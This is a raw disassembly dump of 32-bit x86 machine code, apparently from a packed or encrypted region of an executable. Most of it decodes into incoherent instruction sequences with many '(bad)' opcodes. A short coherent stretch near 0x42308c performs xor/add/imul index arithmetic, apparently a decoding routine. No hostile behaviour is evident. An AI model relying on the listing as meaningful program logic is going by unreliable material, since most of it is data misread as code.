  422e6a:	pop    ecx
  422e6b:	sub    edx,DWORD PTR [edx-0x70ed9206]
  422e71:	loope  0x422e84
  422e73:	aas    
  422e74:	pop    ebx
  422e75:	cwde   
  422e76:	pop    ebp
  422e77:	data16 mov bh,dh
  422e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e7b:	cld    
  422e7c:	inc    ecx
  422e7d:	or     al,0x5
  422e7f:	sbb    ch,BYTE PTR [esi-0x24aafa10]
  422e85:	mov    cl,0x37
  422e87:	loope  0x422e0c
  422e89:	(bad)  
  422e8b:	pop    esp
  422e8c:	pop    es
  422e8d:	mov    edx,?
  422e8f:	stos   BYTE PTR es:[edi],al
  422e90:	ins    BYTE PTR es:[edi],dx
  422e91:	fucomi st,st(1)
  422e93:	lfs    edi,FWORD PTR [edx+0x55]
  422e97:	outs   dx,BYTE PTR ds:[esi]
  422e98:	xchg   ebp,eax
  422e99:	aam    0xf2
  422e9b:	int    0x9d
  422e9d:	rcr    DWORD PTR [edx+0x1494d4ef],1
  422ea3:	dec    ecx
  422ea4:	inc    esi
  422ea5:	mov    edi,0x6b00b18c
  422eaa:	int    0xd4
  422eac:	add    eax,0xafc0cd8e
  422eb1:	and    edi,DWORD PTR [ecx+ebp*8]
  422eb4:	das    
  422eb5:	mov    esp,eax
  422eb7:	pusha  
  422eb8:	fwait
  422eb9:	scas   eax,DWORD PTR es:[edi]
  422eba:	ror    DWORD PTR [esi-0x4f60b02e],0x56
  422ec1:	es aad 0x35
  422ec4:	mov    esi,0x6aa0f57
  422ec9:	icebp  
  422eca:	pop    esp
  422ecb:	in     eax,0x9
  422ecd:	inc    ebx
  422ece:	(bad)  [eax+eiz*8]
  422ed1:	and    BYTE PTR [ecx],al
  422ed3:	mov    dl,0x9d
  422ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed6:	(bad)  
  422ed7:	shr    ebx,cl
  422ed9:	loopne 0x422e82
  422edb:	push   ebx
  422edc:	ror    BYTE PTR [edx+0x32],0xe8
  422ee0:	sti    
  422ee1:	xor    al,0x25
  422ee3:	xchg   BYTE PTR [esi-0x5c42ea6c],bl
  422ee9:	adc    DWORD PTR [ebp+0x56],ebp
  422eec:	jmp    0x422ebb
  422eee:	leave  
  422eef:	ds jnp 0x422f6d
  422ef2:	sub    ecx,DWORD PTR [edx-0x38361252]
  422ef8:	shl    BYTE PTR [ecx+0x58ba2434],0x49
  422eff:	icebp  
  422f00:	sbb    al,0xaa
  422f02:	lahf   
  422f03:	xchg   BYTE PTR [ecx-0x4f],dh
  422f06:	dec    eax
  422f07:	inc    edx
  422f08:	sub    eax,0x4e1f19f3
  422f0d:	pop    es
  422f0e:	dec    ecx
  422f0f:	mov    ebp,0xf071ed01
  422f14:	jne    0x422f37
  422f16:	stos   BYTE PTR es:[edi],al
  422f17:	jge    0x422f3e
  422f19:	sub    BYTE PTR [edx],ah
  422f1b:	mov    eax,0x4019e74d
  422f20:	push   esi
  422f21:	enter  0x826f,0x74
  422f25:	mov    ebp,0x65e74f
  422f2a:	nop
  422f2b:	inc    edi
  422f2c:	mov    edi,0xd1e1cde
  422f31:	ds cld 
  422f33:	inc    edi
  422f34:	xchg   BYTE PTR [edx+0x18],al
  422f37:	mov    dh,0xda
  422f39:	sbb    bh,bl
  422f3b:	jb     0x422efd
  422f3d:	(bad)  
  422f3e:	lock test al,0x69
  422f41:	cmp    al,0x23
  422f43:	sub    eax,0x6f57b85e
  422f48:	jmp    0x1875:0xf9008c0b
  422f4f:	call   0x34839e83
  422f54:	add    DWORD PTR [eax+0x21d4a7f5],0x6a
  422f5b:	push   0x73529e6c
  422f60:	in     al,dx
  422f61:	lods   al,BYTE PTR ds:[esi]
  422f62:	fstp   QWORD PTR [ecx]
  422f64:	rcr    DWORD PTR ds:0xaf45250f,cl
  422f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6b:	mov    cl,0x2f
  422f6d:	xchg   BYTE PTR [edi],bh
  422f6f:	inc    ebx
  422f70:	add    edx,DWORD PTR [edi]
  422f72:	jge    0x422f81
  422f74:	cs mov edx,0xcef95de0
  422f7a:	jnp    0x422f2f
  422f7c:	push   ecx
  422f7d:	nop
  422f7e:	sub    ebx,esi
  422f80:	push   ds
  422f81:	idiv   eax
  422f83:	bound  esi,QWORD PTR [edx+esi*1-0x5ec757fa]
  422f8a:	jmp    0x422fdd
  422f8c:	or     DWORD PTR [ecx-0x20],edx
  422f8f:	sbb    al,0xf9
  422f91:	call   0xb93bf4ec
  422f96:	sar    DWORD PTR ds:0x90610344,1
  422f9c:	pop    ebx
  422f9d:	nop
  422f9e:	fnstenv [edi]
  422fa0:	inc    edx
  422fa1:	pop    edi
  422fa2:	mov    dh,BYTE PTR [edx-0x7491b89c]
  422fa8:	out    0x57,al
  422faa:	bound  ecx,QWORD PTR [ebp-0x3c0afc49]
  422fb0:	ret    
  422fb1:	fdivr  st,st(7)
  422fb3:	gs push esi
  422fb5:	push   edx
  422fb6:	in     al,dx
  422fb7:	outs   dx,DWORD PTR ds:[esi]
  422fb8:	(bad)  [ecx-0x36]
  422fbb:	sub    al,0xfa
  422fbd:	xchg   ebx,eax
  422fbe:	pop    ebx
  422fbf:	sub    ch,BYTE PTR [ecx]
  422fc1:	xchg   esi,eax
  422fc2:	lods   al,BYTE PTR ds:[esi]
  422fc3:	mov    edx,0xde64dc9a
  422fc8:	fnstenv [ebp-0x69]
  422fcb:	jnp    0x422fa7
  422fcd:	out    0x61,eax
  422fcf:	push   ss
  422fd0:	jbe    0x422f79
  422fd2:	hlt    
  422fd3:	dec    esp
  422fd4:	or     bl,BYTE PTR ds:0xa99b9a37
  422fda:	mov    esp,esp
  422fdc:	mov    cl,0xd9
  422fde:	pop    esi
  422fdf:	repnz add al,0x6
  422fe2:	adc    DWORD PTR [ebp+eiz*2-0x7e],0x1497b15f
  422fea:	inc    esi
  422feb:	fdivr  QWORD PTR [eax-0x20]
  422fee:	cwde   
  422fef:	adc    edi,DWORD PTR [ebp-0x62]
  422ff2:	mov    al,ds:0x9abb0c64
  422ff7:	mov    edi,0x6e8ab781
  422ffc:	shr    ah,cl
  422ffe:	out    0x2e,eax
  423000:	icebp  
  423001:	aam    0x5b
  423003:	inc    ebp
  423004:	ret    
  423005:	pusha  
  423006:	jecxz  0x42301b
  423008:	rcr    DWORD PTR [edx],cl
  42300a:	iret   
  42300b:	or     bh,dl
  42300d:	mov    al,0x34
  42300f:	iret   
  423010:	fdiv   st(0),st
  423012:	ds mov dl,0x3f
  423015:	imul   edx,DWORD PTR [eax+eiz*1+0x4cb8eee9],0xffffffa4
  42301d:	dec    edx
  42301e:	pop    es
  42301f:	adc    DWORD PTR [eax+eax*4+0x371dcaa2],ebx
  423026:	daa    
  423027:	jo     0x4230a1
  423029:	mov    bl,0xb6
  42302b:	stc    
  42302c:	rcr    BYTE PTR [edi],cl
  42302e:	out    0x65,eax
  423030:	ja     0x42301f
  423032:	push   cs
  423033:	dec    esp
  423034:	mov    esi,0x3a2d8dc2
  42303a:	jb     0x42305b
  42303c:	adc    esp,DWORD PTR [esi+0x6e706285]
  423042:	xchg   edi,eax
  423043:	adc    BYTE PTR [esi+0x727f1760],dh
  423049:	pop    eax
  42304a:	pop    esp
  42304b:	ins    DWORD PTR es:[edi],dx
  42304c:	or     ecx,DWORD PTR fs:[edi]
  42304f:	lods   al,BYTE PTR ds:[esi]
  423050:	push   0xb
  423052:	push   0xc1d7b045
  423057:	fisub  DWORD PTR [eax]
  423059:	enter  0x4be3,0xc4
  42305d:	and    BYTE PTR [edx+0x5f],0xa3
  423061:	loopne 0x42300d
  423063:	adc    DWORD PTR [ecx+0x3f],eax
  423066:	or     bl,BYTE PTR [esi+ecx*8+0x639d3db1]
  42306d:	xor    eax,DWORD PTR [ebp+0x64]
  423070:	fwait
  423071:	sbb    dh,BYTE PTR [eax+0x32]
  423074:	stc    
  423075:	out    0x73,al
  423077:	sbb    eax,0x7652bf68
  42307c:	(bad)  
  42307d:	adc    cl,BYTE PTR [ebx-0x7229ccd0]
  423083:	test   BYTE PTR [edx],al
  423085:	(bad)  [edx+0x32]
  423088:	add    BYTE PTR [edi],cl
  42308a:	mov    dh,0x55
  42308c:	push   DWORD PTR [ebx]
  42308e:	ror    BYTE PTR [eax+0x458aff55],1
  423094:	dec    DWORD PTR [ebx+0x5d8be455]
  42309a:	hlt    
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423ad6
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   bh,bh
  4230e4:	dec    edx
  4230e5:	pop    eax
  4230e6:	retf   
  4230e7:	mov    cl,0x94
  4230e9:	popa   
  4230ea:	bound  ebx,QWORD PTR [ebx-0x39d9d87]
  4230f0:	mov    ds:0xc27745c4,eax
  4230f5:	bound  ebp,QWORD PTR [bp-0x8df]
  4230fa:	stc    
  4230fb:	ja     0x42313c
  4230fd:	pushf  
  4230fe:	and    eax,0xcdd04790
  423103:	xchg   ecx,eax
  423104:	jae    0x423153
  423106:	add    BYTE PTR [ebx-0xf],dl
  423109:	sbb    eax,esp
  42310b:	mov    ds:0xe2fe62c1,al
  423110:	clc    
  423111:	cmp    DWORD PTR [edx+0x4b431471],edx
  423117:	imul   esi,DWORD PTR [edx+0xe840543],0xffffffdb
  42311e:	cmp    eax,0x1d7f358e
  423123:	xor    DWORD PTR [eax],esi
  423125:	cdq    
  423126:	cmp    DWORD PTR [ecx+0xc],0x90fa0c7a
  42312d:	ja     0x42310e
  42312f:	mov    eax,edx
  423131:	pop    ds
  423132:	repnz sub BYTE PTR [eax+ebx*2-0x20],dh
  423137:	cmp    eax,0xfcd6eecc
  42313c:	xchg   ch,cl
  42313e:	adc    eax,0x8282b9ae
  423143:	mov    ebp,0x29cb5904
  423148:	clc    
  423149:	inc    ebp
  42314a:	das    
  42314b:	pop    ss
  42314c:	mov    ds:0x3ed29590,al
  423151:	mov    edi,0x694b792c
  423156:	mov    dl,0x44
  423158:	xchg   edi,eax
  423159:	fdivr  QWORD PTR [esi]
  42315b:	sub    al,0xf5
  42315d:	pop    esi
  42315e:	sbb    DWORD PTR [eax+edi*4-0x26],eax
  423162:	jle    0x423133
  423164:	xchg   BYTE PTR [eax-0x25],bh
  423167:	gs fcom st(4)
  42316a:	cmc    
  42316b:	push   0xf2ba4fe1
  423170:	scas   al,BYTE PTR es:[edi]
  423171:	sub    esi,DWORD PTR ds:0x790faf1c
  423177:	pop    edi
  423178:	xlat   BYTE PTR ds:[ebx]
  423179:	dec    esp
  42317a:	out    0x8c,eax
  42317c:	inc    edi
  42317d:	jmp    0xa6cc:0xb9ea7617
  423184:	ror    DWORD PTR [ecx-0x6ea35f2a],cl
  42318a:	ins    DWORD PTR es:[edi],dx
  42318b:	sbb    ch,dh
  42318d:	push   ecx
  42318e:	lods   al,BYTE PTR ds:[esi]
  42318f:	stos   BYTE PTR es:[edi],al
  423190:	test   al,0xd0
  423192:	dec    edi
  423193:	pop    edx
  423194:	rcl    BYTE PTR [eax],cl
  423196:	and    al,0x1a
  423198:	push   cs
  423199:	cli    
  42319a:	push   es
  42319b:	loope  0x4231bd
  42319d:	test   dh,al
  42319f:	and    BYTE PTR [ecx],ah
  4231a1:	mov    bh,0x48
  4231a3:	sahf   
  4231a4:	fwait
  4231a5:	mov    esp,ds
  4231a7:	int3   
  4231a8:	scas   eax,DWORD PTR es:[edi]
  4231a9:	imul   esi,DWORD PTR [edi-0x16],0x5756c732
  4231b0:	xchg   edx,eax
  4231b1:	or     DWORD PTR [esi],ecx
  4231b3:	pop    esp
  4231b4:	repnz cmp bl,BYTE PTR [ebx]
  4231b7:	pop    ebx
  4231b8:	ins    DWORD PTR es:[edi],dx
  4231b9:	adc    BYTE PTR [ebp+0x74],ah
  4231bc:	sub    al,0x66
  4231be:	inc    DWORD PTR [eax]
  4231c0:	cmp    DWORD PTR [ecx],ebx
  4231c2:	inc    esp
  4231c3:	std    
  4231c4:	call   FWORD PTR [ecx+0x179db18b]
  4231ca:	into   
  4231cb:	popa   
  4231cc:	inc    ecx
  4231cd:	mov    cl,0xd0
  4231cf:	sbb    eax,0xeadb71cc
  4231d4:	stos   DWORD PTR es:[edi],eax
  4231d5:	mov    esi,0xebff4676
  4231da:	pop    ecx
  4231db:	mov    WORD PTR [ecx+0xb],?
  4231de:	retf   
  4231df:	mov    ds:0x371c45a3,al
  4231e4:	fimul  DWORD PTR [eax+0x52]
  4231e7:	jo     0x4231ae
  4231e9:	repnz (bad)
  4231ec:	into   
  4231ed:	mov    WORD PTR [edi+0x63],cs
  4231f0:	in     al,0x65
  4231f2:	jns    0x4231a0
  4231f4:	cmc    
  4231f5:	jg     0x42317e
  4231f7:	fcomp  DWORD PTR [esi+0x337dc88d]
  4231fd:	inc    ebx
  4231fe:	pop    edi
  4231ff:	and    al,0x93
  423201:	ret    0x157a
  423204:	(bad)  
  423206:	sbb    BYTE PTR [ebp-0x25d73f37],0xa5
  42320d:	paddq  mm6,QWORD PTR [eax-0x5153ce9a]
  423214:	push   edx
  423215:	mov    ds:0xe99eb218,al
  42321a:	and    DWORD PTR [ecx],edx
  42321c:	adc    DWORD PTR [ebp+0x3e],ebp
  42321f:	mov    dl,0x7b
  423221:	dec    ecx
  423222:	(bad)  
  423223:	adc    eax,0x61abff6d
  423228:	jae    0x423212
  42322a:	xchg   ebp,eax
  42322b:	add    eax,0x21dd2767
  423230:	cs repz hlt 
  423233:	sub    bh,dh
  423235:	lods   al,BYTE PTR ds:[esi]
  423237:	xchg   ebx,eax
  423238:	push   cs
  423239:	adc    ebp,esi
  42323b:	push   edx
  42323c:	mov    ecx,0x9ef188bd
  423241:	push   eax
  423242:	xchg   ecx,eax
  423243:	imul   ecx,DWORD PTR es:[eax+0x224afe55],0x0
  42324b:	lahf   
  42324c:	dec    ecx
  42324d:	adc    al,0xdf
  42324f:	push   esp
  423250:	repnz inc ebp
  423252:	rol    BYTE PTR [eax+0x33],cl
  423255:	pop    edx
  423256:	xchg   ebp,eax
  423257:	add    ebp,DWORD PTR [edx+edi*2+0x12cc4a1]
  42325e:	adc    ecx,DWORD PTR [eax+0x60]
  423261:	int3   
  423262:	pop    edi
  423263:	in     eax,dx
  423264:	xor    BYTE PTR [eax],al
  423266:	xchg   edi,eax
  423267:	jl     0x4232e1
  423269:	repnz imul edx,ecx,0x6df43c59
  423270:	cs jo  0x423249
  423273:	push   esi
  423274:	repz inc esp
  423276:	or     al,0x9f
  423278:	jns    0x42328a
  42327a:	dec    edi
  42327b:	and    eax,0x15b6359c
  423280:	(bad)  
  423281:	jmp    0xbefe60f4
  423286:	xchg   edx,eax
  423287:	sbb    DWORD PTR [esi],eax
  423289:	mov    eax,0xc8d6858
  42328e:	mov    edx,0x64021bce
  423293:	call   0x8507:0xdf5352fb
  42329a:	test   BYTE PTR [edi+0x2c],ch
  42329d:	stos   BYTE PTR es:[edi],al
  42329e:	inc    ebp
  42329f:	pop    esi
  4232a0:	sub    dh,cl
  4232a2:	aaa    
  4232a3:	dec    ebx
  4232a4:	ja     0x423287
  4232a6:	out    0x72,al
  4232a8:	loope  0x423290
  4232aa:	adc    al,0x6e
  4232ac:	fs or  dh,dh
  4232af:	and    DWORD PTR [eax+0x6a],ecx
  4232b2:	and    cl,BYTE PTR [edi-0x22]
  4232b5:	mov    bl,0x98
  4232b7:	cdq    
  4232b8:	jle    0x42331f
  4232ba:	adc    cl,BYTE PTR [ebx+0x755b073f]
  4232c0:	adc    eax,0x69d0af4e
  4232c5:	scas   eax,DWORD PTR es:[edi]
  4232c6:	mov    ecx,0x8de2288f
  4232cb:	mov    fs,WORD PTR [ecx+ebp*4+0x7a]
  4232cf:	xor    DWORD PTR [ecx+eiz*2-0x6b44172a],edi
  4232d6:	mov    BYTE PTR [eax],bl
  4232d8:	jmp    0xcb6a:0x496e8541
  4232df:	frstor [edx]
  4232e1:	ficom  DWORD PTR [ebx+0x57]
  4232e4:	rcr    BYTE PTR [edx+0x24],cl
  4232e7:	scas   al,BYTE PTR es:[edi]
  4232e8:	or     eax,0x6ffc317b
  4232ed:	mov    ch,BYTE PTR [ecx-0x4f74f1d]
  4232f3:	or     al,0x9e
  4232f5:	xchg   esp,eax
  4232f6:	jecxz  0x423362
  4232f8:	dec    ebx
  4232f9:	mov    al,0xa3
  4232fb:	ss sbb al,0x66
  4232fe:	icebp  
  4232ff:	push   ds
  423300:	add    bh,BYTE PTR [edx+0x72]
  423303:	jg     0x4232c4
  423305:	mov    ?,WORD PTR [esi+0x350f3fb8]
  42330b:	les    edx,FWORD PTR cs:[edx]
  42330e:	cwde   
  42330f:	push   esp
  423310:	adc    ch,BYTE PTR ds:0x2f309a1a
  423316:	xor    ch,ah
  423318:	cli    
  423319:	mov    cl,0x58
  42331b:	dec    edi
  42331c:	adc    al,0x47
  42331e:	leave  
  42331f:	mov    ?,eax
  423321:	stos   DWORD PTR es:[edi],eax
  423322:	cmp    al,0x3e
  423324:	loop   0x423332
  423326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423327:	aaa    
  423328:	pop    edi
  423329:	mov    edx,0x71068dd3
  42332e:	mov    eax,ds:0x88412f80
  423333:	or     ah,BYTE PTR [ecx+0x78]
  423336:	jl     0x423366
  423338:	repnz sub ch,BYTE PTR [eax+0x4]
  42333c:	sbb    BYTE PTR [ecx-0xab6905b],0x40
  423343:	in     eax,0x4f
  423345:	push   edi
  423346:	loop   0x423360
  423348:	arpl   si,bx
  42334a:	mov    edx,0x13493d53
  42334f:	inc    esp
  423350:	push   0xffffffe1
  423352:	push   0x77
  423354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423355:	pop    esp
  423356:	push   cs
  423357:	mov    esp,0xf6a47f1f
  42335c:	sti    
  42335d:	jno    0x423328
  42335f:	mov    BYTE PTR [ecx],ch
  423361:	addr16 popf 
  423363:	imul   edi,DWORD PTR [edi],0xffffff81
  423366:	js     0x423355
  423368:	pushf  
  423369:	inc    ecx
  42336a:	jbe    0x423318
  42336c:	sahf   
  42336d:	(bad)  
  42336e:	jmp    0xa23e8e9
  423373:	sbb    BYTE PTR [ebp+0x24],ah
  423376:	add    DWORD PTR [edx-0x7f9a2d86],edi
  42337c:	ins    BYTE PTR es:[edi],dx
  42337d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42337e:	push   0x27
  423380:	fs pop esi
  423382:	cli    
  423383:	jae    0x42331f
  423385:	and    ebx,DWORD PTR [ebx-0x1f]
  423388:	xor    eax,0xebcd0ba1
  42338d:	jo     0x4233e1
  42338f:	and    dl,BYTE PTR [ebx]
  423391:	dec    eax
  423392:	icebp  
  423393:	mov    ah,0x59
  423395:	mov    ch,0xc6
  423397:	xchg   ebx,eax
  423398:	int    0x8f
  42339a:	mov    dl,0x5
  42339c:	hlt    
  42339d:	mov    ebp,0x1a48130c
  4233a2:	push   0x1d
  4233a4:	int    0x2
  4233a6:	in     eax,0x96
  4233a8:	dec    edi
  4233a9:	aas    
  4233aa:	pop    esp
  4233ab:	and    ah,BYTE PTR [ebp+0x1ce040bc]
  4233b1:	rcl    dl,0x1
  4233b4:	fs or  ecx,ebp
  4233b7:	jno    0x4233a1
  4233b9:	jl     0x4233b6
  4233bb:	sti    
  4233bc:	push   0x5
  4233be:	push   eax
  4233bf:	test   eax,0xac6eb3d4
  4233c4:	push   ds
  4233c5:	or     ebx,ebx
  4233c7:	lock fwait
  4233c9:	dec    ebp
  4233ca:	in     eax,0x59
  4233cc:	jl     0x423440
  4233ce:	mul    esp
  4233d0:	call   0x41b3ad40
  4233d5:	xor    eax,0x6ffaedf5
  4233da:	mov    ch,0xec
  4233dc:	lods   al,BYTE PTR ds:[esi]
  4233dd:	sub    DWORD PTR [esi],0xfffffffa
  4233e0:	xchg   ecx,eax
  4233e1:	or     dl,BYTE PTR [ebx-0x7d966e6]
  4233e7:	out    0xc3,al
  4233e9:	xor    bl,BYTE PTR [edx-0x6d]
  4233ec:	mov    ecx,0x13a61119
  4233f1:	out    dx,eax
  4233f2:	stc    
  4233f3:	test   BYTE PTR [edi+0x54],ah
  4233f6:	mov    al,0x5d
  4233f8:	dec    esp
  4233f9:	xor    eax,0x9b88cd8c
  4233fe:	aam    0xe9
  423400:	xchg   ebp,eax
  423401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423402:	dec    ecx
  423403:	ss push ecx
  423405:	push   eax
  423406:	je     0x4233f9
  423408:	inc    ecx
  423409:	(bad)  
  42340a:	sbb    bl,BYTE PTR [eax-0x2]
  42340d:	iret   
  42340e:	fiadd  WORD PTR [edi-0x4fb79d0e]
  423414:	and    al,0x8e
  423416:	jbe    0x42348b
  423418:	int3   
  423419:	mov    bh,0xe6
  42341b:	lods   al,BYTE PTR ds:[esi]
  42341c:	pop    esi
  42341d:	xor    al,0xe2
  42341f:	fprem1 
  423421:	les    edi,FWORD PTR [edx-0x26a1c01f]
  423427:	cld    
  423428:	inc    ebp
  423429:	clc    
  42342a:	or     bh,ch
  42342c:	add    dh,bl
  42342e:	adc    DWORD PTR [esi],eax
  423430:	mov    al,0x38
  423432:	jne    0x4233c6
  423434:	mov    bh,0xb4
  423436:	(bad)  
  423437:	leave  
  423438:	jbe    0x42342a
  42343a:	xchg   ebx,eax
  42343b:	push   ss
  42343c:	daa    
  42343d:	pop    edx
  42343e:	inc    edi
  42343f:	into   
  423440:	jmp    0x9c81:0xfba9256b
  423447:	std    
  423448:	jb     0x42340f
  42344a:	div    BYTE PTR [ecx-0x53]
  42344d:	mov    BYTE PTR [edi-0xc],cl
  423450:	sub    al,0x49
  423452:	imul   DWORD PTR [esi-0x29]
  423455:	mov    BYTE PTR [ebp-0x7d22f2c5],bh
  42345b:	shr    DWORD PTR [edx+ebx*4-0x3577da0b],1
  423462:	or     ebx,DWORD PTR [eax]
  423464:	fwait
  423465:	mov    DWORD PTR [ebx+0x59821c88],edx
  42346b:	lock mov WORD PTR [esi+0x6e72c6fb],ds
  423472:	and    ch,ah
  423474:	inc    edi
  423475:	push   0xffffffea
  423477:	mov    bl,0x3e
  423479:	mov    bl,BYTE PTR [edx+ebx*2]
  42347c:	in     eax,0xb2
  42347e:	xchg   ebp,eax
  42347f:	dec    edi
  423480:	pop    ecx
  423481:	std    
  423482:	mov    ebx,0xe4c40f93
  423487:	adc    al,0xae
  423489:	and    DWORD PTR [ecx-0x4e3ead50],edi
  42348f:	jne    0x4234ca
  423491:	adc    BYTE PTR [esp+edi*1+0x8],ch
  423495:	icebp  
  423496:	imul   BYTE PTR [ecx+0x47]
  423499:	and    esi,DWORD PTR [edx]
  42349b:	call   0x2036:0xa1ce9ceb
  4234a2:	lods   al,BYTE PTR ds:[esi]
  4234a3:	mov    cl,0xf2
  4234a5:	lods   al,BYTE PTR ds:[esi]
  4234a6:	dec    edx
  4234a7:	sahf   
  4234a8:	sub    DWORD PTR [ecx],ecx
  4234aa:	test   BYTE PTR [ebx],al
  4234ac:	sub    BYTE PTR [ecx+edx*8],ch
  4234af:	xor    BYTE PTR [eax+0x5d567ff9],ah
  4234b5:	jnp    0x4234d9
  4234b7:	pop    es
  4234b8:	sub    BYTE PTR [edx+0x2abe3694],0xa4
  4234bf:	ds inc edi
  4234c1:	(bad)  
  4234c2:	or     ecx,DWORD PTR [ecx-0x33]
  4234c5:	add    BYTE PTR [edx+0x3483ad03],dh
  4234cb:	test   al,0x3e
  4234cd:	imul   esi
  4234cf:	inc    ebp
  4234d0:	dec    esi
  4234d1:	sbb    ecx,esi
  4234d3:	pop    es
  4234d4:	gs dec edx
  4234d6:	mov    ch,0x1f
  4234d8:	fsubr  QWORD PTR [ebp-0x6]
  4234db:	inc    esp
  4234dc:	jmp    0x7e3a:0x8e087b75
  4234e3:	aas    
  4234e4:	mov    dl,BYTE PTR [eax-0x620c1751]
  4234ea:	mov    cl,0x39
  4234ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234ed:	mov    al,0xa3
  4234ef:	rcr    DWORD PTR [ebx+0x12],1
  4234f2:	pop    esp
  4234f3:	repnz push ebp
  4234f5:	push   ebp
  4234f6:	cmp    ah,BYTE PTR [eax+0x2ac71ef8]
  4234fc:	inc    esi
  4234fd:	outs   dx,BYTE PTR ds:[esi]
  4234fe:	js     0x423543
  423500:	mov    ch,0x6a
  423502:	xor    ecx,ebp
  423504:	xchg   DWORD PTR [eax+0x357e25b3],ebp
  42350a:	ror    BYTE PTR [eax+0x1919a113],1
  423510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423511:	lock push 0xffffff80
  423514:	fcomp  DWORD PTR [edi+0x3ba93ef8]
  42351a:	add    al,0xd5
  42351c:	cmp    al,BYTE PTR [edi]
  42351e:	jnp    0x4234b8
  423520:	(bad)  
  423521:	je     0x42351f
  423523:	shr    DWORD PTR [edx+0x47],0x9e
  423527:	aas    
  423528:	je     0x423568
  42352a:	and    BYTE PTR [esi+0x57],0x74
  42352e:	push   edi
  42352f:	retf   0xc447
  423532:	pop    esi
  423533:	and    esi,DWORD PTR [ecx+0x7d1e41fe]
  423539:	ror    BYTE PTR [ebx+ecx*4+0x80ed6aa],cl
  423540:	cmp    al,0x84
  423542:	sub    DWORD PTR [ebp-0x1b],edi
  423545:	sahf   
  423546:	and    al,0xe
  423548:	sub    ebx,DWORD PTR [ebp+0x1bf23ba3]
  42354e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42354f:	rcl    BYTE PTR [esi+0x78ca5d62],1
  423555:	cdq    
  423556:	xchg   edi,eax
  423557:	gs pop ecx
  423559:	test   al,0xeb
  42355b:	add    ebp,DWORD PTR [ebp+0x3]
  42355e:	std    
  42355f:	cmp    esp,ecx
  423561:	xor    ch,BYTE PTR [ebx+0x73a389b]
  423567:	xchg   ebp,eax
  423568:	xlat   BYTE PTR ds:[ebx]
  423569:	jmp    0x423556
  42356b:	rol    DWORD PTR [esi+ebp*8],1
  42356e:	sub    al,0xf0
  423570:	test   eax,0x641c7260
  423575:	xchg   edx,eax
  423576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423577:	ret    0xa693
  42357a:	pop    es
  42357b:	mov    edi,DWORD PTR [ecx-0x41]
  42357e:	daa    
  42357f:	stc    
  423580:	adc    esp,DWORD PTR [edi-0x3bd51844]
  423586:	test   eax,0x476211d9
  42358b:	ins    BYTE PTR es:[edi],dx
  42358c:	idiv   esp
  42358e:	or     al,0x5f
  423590:	fldenv [eax]
  423592:	jns    0x423541
  423594:	add    al,0x9d
  423596:	jbe    0x42352f
  423598:	ret    
  423599:	sar    BYTE PTR ds:0xc311a4b5,0xd2
  4235a0:	adc    cl,BYTE PTR [edx-0x6d]
  4235a3:	xchg   BYTE PTR [ebx+0x44],cl
  4235a6:	loope  0x4235c1
  4235a8:	or     eax,0xe77f64e8
  4235ad:	imul   eax,DWORD PTR [edx],0x9a901e46
  4235b3:	adc    edi,DWORD PTR [edx]
  4235b5:	(bad)  
  4235b6:	sbb    al,0xb5
  4235b8:	ret    0xd827
  4235bb:	inc    esi
  4235bc:	mov    ds:0xc449d2e4,al
  4235c1:	mov    bl,0xfc
  4235c3:	jge    0x423641
  4235c5:	pop    ebx
  4235c6:	inc    eax
  4235c7:	daa    
  4235c8:	cli    
  4235c9:	(bad)  
  4235cb:	push   edi
  4235cc:	push   ss
  4235cd:	dec    esp
  4235ce:	test   al,0xcd
  4235d0:	push   ebp
  4235d1:	inc    DWORD PTR [edi]
  4235d3:	out    0xa6,eax
  4235d5:	or     BYTE PTR cs:[ebx+ecx*4-0x552c527c],dl
  4235dd:	inc    ebp
  4235de:	test   al,0x9c
  4235e0:	sbb    BYTE PTR [edx+0x2a],dl
  4235e3:	into   
  4235e4:	xor    al,0x6a
  4235e6:	xchg   ebp,eax
  4235e7:	add    ebx,DWORD PTR [edx+0x7e]
  4235ea:	in     eax,dx
  4235eb:	imul   eax,DWORD PTR [edx],0xaee2cf9
  4235f1:	stc    
  4235f2:	(bad)  
  4235f4:	(bad)  
  4235f5:	fnstenv ds:0x224d2e80
  4235fb:	ss out dx,al
  4235fd:	xchg   esi,eax
  4235fe:	arpl   dx,bx
  423600:	xor    ebp,DWORD PTR [ebx-0x2b7097ad]
  423606:	aad    0x6f
  423608:	sbb    DWORD PTR [ecx-0x2938099f],edx
  42360e:	inc    edx
  42360f:	imul   esp,DWORD PTR [edx],0x79
  423612:	pusha  
  423613:	adc    edx,esp
  423615:	mov    al,ds:0x25f1ab2e
  42361a:	stos   BYTE PTR es:[edi],al
  42361b:	(bad)  
  42361d:	pushf  
  42361e:	jmp    0x423638
  423620:	xor    BYTE PTR [eax],0xaf
